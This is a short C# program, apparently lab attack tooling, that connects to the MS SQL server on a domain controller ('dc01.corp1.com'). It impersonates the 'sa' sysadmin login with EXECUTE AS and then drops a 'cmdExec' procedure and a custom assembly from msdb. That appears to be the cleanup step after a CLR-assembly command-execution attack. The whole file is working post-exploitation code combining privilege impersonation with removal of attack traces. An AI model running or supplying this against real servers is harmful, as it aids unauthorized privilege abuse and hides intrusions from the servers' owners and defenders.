using System;
using System.Data.SqlClient;

namespace SqlCleanup
{
    class Program
    {
        static void Main(string[] args)
        {
            //HARDCODED SERVER FQDN HERE
            String sqlServer = "dc01.corp1.com";
            //Default DB name on MS SQL
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String switchdb = "use msdb;";
            String dropproc = "DROP PROCEDURE cmdExec;";
            String dropasm = "DROP ASSEMBLY myAssembly;";

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(switchdb, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(dropproc, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(dropasm, con);
            reader = command.ExecuteReader();
            reader.Close();
        }
    }
}